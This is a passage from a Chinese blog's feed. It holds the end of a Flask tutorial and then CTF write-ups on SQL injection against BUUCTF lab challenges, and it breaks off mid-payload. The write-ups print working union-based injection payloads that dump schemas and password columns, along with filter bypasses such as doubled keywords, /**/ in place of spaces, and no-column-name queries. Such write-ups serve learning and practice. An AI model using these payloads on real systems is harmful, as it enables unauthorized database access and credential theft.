punctuation">></span></span></code></pre><p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>{% with messages = get_flashed_messages() %}    {% if messages %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          {% for message in messages %}          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>{{  message }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>          {% endfor %}        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    {% endif %} {% endwith %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>post</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span>multipart/form-data</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>Upload</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>send_from_directory<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filenameUPLOAD_FOLDER <span class="token operator">=</span> r<span class="token string">'E:\\flask\\upload\\'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'txt'</span><span class="token punctuation">,</span> <span class="token string">'pdf'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">}</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDERapp<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#判断上传的文件是否非法</span>    <span class="token keyword">if</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token punctuation">:</span>        <span class="token keyword">return</span> filename    <span class="token keyword">else</span><span class="token punctuation">:</span>        flash<span class="token punctuation">(</span><span class="token string">'illegal file'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># check if the post request has the file part</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token operator">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>             flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>          <span class="token comment" spellcheck="true"># if user does not select file, browser also</span>        <span class="token comment" spellcheck="true"># submit an empty part without filename</span>        <span class="token keyword">if</span> file<span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> file <span class="token operator">and</span> allowed_file<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>              filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>            file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#save方法保存文件</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'uploaded_file'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/uploads/&lt;filename>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">uploaded_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p><p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>参考链接：</p><blockquote><p><a href="https://dormousehole.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p><p><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Flask是一个用Python编写的Web应用程序框架。 它由 &lt;strong&gt;Armin Ronacher&lt;/strong&gt; 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和&lt;a href=&quot;http://docs.jinkan.org/docs/jinja2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Jinja2&lt;/a&gt;模板引擎。两者都是Pocco项目。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dormousehole.readthedocs.io/en/latest/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Flask中文文档&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="Flask" scheme="https://www.extrader.top/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://www.extrader.top/2020/03/25/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.extrader.top/2020/03/25/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-24T16:00:00.000Z</published>
    <updated>2020-05-19T14:07:16.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="极客大挑战—LoveSQL"><a href="#极客大挑战—LoveSQL" class="headerlink" title="极客大挑战—LoveSQL"></a>极客大挑战—LoveSQL</h3><p><strong>解题核心</strong> ———————- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc" target="_blank" rel="noopener"><strong>group_concat</strong>()</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Axos1ZnBL2yN5YD.png" style="zoom: 33%;" / loading="lazy"><p>随后开始注入查询：</p><p>经过union测试发现有3个字段，并且2,3字段可查询，2字段查询结果看不清，用第3字段</p><p>查数据库：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查表：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查列：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>最后password对应的表名应该是前面查询表名最后一个</p><p>查l0ve1ysq1表最后一列的字段内容：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>最终得到flag</p><h3 id="极客大挑战—BabySQL"><a href="#极客大挑战—BabySQL" class="headerlink" title="极客大挑战—BabySQL"></a>极客大挑战—BabySQL</h3><p><strong>解题核心</strong>—————–双写绕过</p><p>详细见CSDN上大佬的<a href="https://blog.csdn.net/whoim_i/article/details/102869687" target="_blank" rel="noopener">文章</a>，另外附上文章的HTML文档</p><p>解题方法和上一个题目的差不多，只是这次多了个双写绕过</p><p>查库：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' uniunionon seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查表：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查列：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查字段，反复尝试后发现flag在表b4bsql中的password列</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span> frfromom b4bsql<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>得到flag</p><h3 id="2019SWPU—Web1"><a href="#2019SWPU—Web1" class="headerlink" title="2019SWPU—Web1"></a>2019SWPU—Web1</h3><p><strong>解题核心</strong>—————–无列名查询</p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/fC6dephA2EGPTkt.png" style="zoom: 67%;" / loading="lazy"><p>测试后发现登录界面做了严密的防注入措施，于是注册账号</p><p>登录后界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/y3YFO5dUm164Vbf.png" alt="" loading="lazy"></p><p>广告申请界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CYufWMHk5dvQZXp.png" style="zoom:67%;" / loading="lazy"><p>随便申请一个：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/JdWt2SMC1DfKNvj.png" alt="" loading="lazy"></p><p>首页显示：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/IRm9FwGvXH81ZiT.png" style="zoom:67%;" / loading="lazy"><p>广告详情：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt="" loading="lazy"></p><p>在广告申请界面测试后发现存在SQL注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt="" loading="lazy"></p><p>配合union查询查列数：</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><p>或</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token comment" spellcheck="true">/**/</span><span class="token operator">&amp;&amp;</span><span class="token comment" spellcheck="true">/**/</span><span class="token string">'1'</span><span class="token operator">=</span>'<span class="token number">1</span></code></pre><blockquote><p>注：</p><ul><li>过滤了–+和#，故闭合最后的单引号</li><li>过滤了空格用/**/分离参数</li></ul></blockquote><p>有22列，由广告详情界面显示可知，第2,3列可注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt="" loading="lazy"></p><p>查数据库库，数据库版本</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><p>查表：</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>mysql<span class="token punctuation">.</span>innodb_table_stats<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><blockquote><p>注：</p><ul><li>此处利用无列名注入</li><li>过滤了information_scheam库的查询，故使用其它库进行查询，此题场景为buuctf上的复现题目，用到mysql库中的mysql.innodb_table_stats表（mysql在5.5.x版本后，默认使用innodb作为存储引擎），比赛时原题可用sys库中的sys.schema_auto_increment_columns表进行查询(mysql版本&gt;5.7时，新增了sys数据库，基础数据来自于performance_chema和information_schema两个库，但是本身数据库不存储数据)，查询语句和上面的一样</li><li>参考：<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">官方文档</a></li><li>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></li><li>参考：<a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a></li></ul></blockquote><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt="" loading="lazy"></p><p>查列</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><blockquote><p>注：无列名注入查询users表有3列，（测试时当查询users列数正确时会报不同的错误）</p></blockquote><p>列数错误时：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt="" loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt="" loading="lazy"></p><p>然后再配合无列名注入注出user表中的flag</p><pre class=" language-sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span>group_concat<span class="token punctuation">(</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">a</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">as</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">b</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">union</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token comment" spellcheck="true">/**/</span>users<span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token 